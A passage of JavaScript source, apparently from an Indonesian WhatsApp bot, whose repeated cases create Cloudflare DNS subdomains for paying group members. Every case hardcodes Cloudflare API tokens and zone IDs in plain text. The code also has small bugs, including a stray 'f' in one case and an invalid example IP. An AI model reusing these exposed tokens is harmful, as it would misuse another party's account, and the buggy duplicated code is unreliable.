             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break

 case 'domain5': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellkuu.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain7': {
 
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283842671582")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283842671582")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283842671582")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rioo STORE_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain13': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain14': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");f
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Official_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
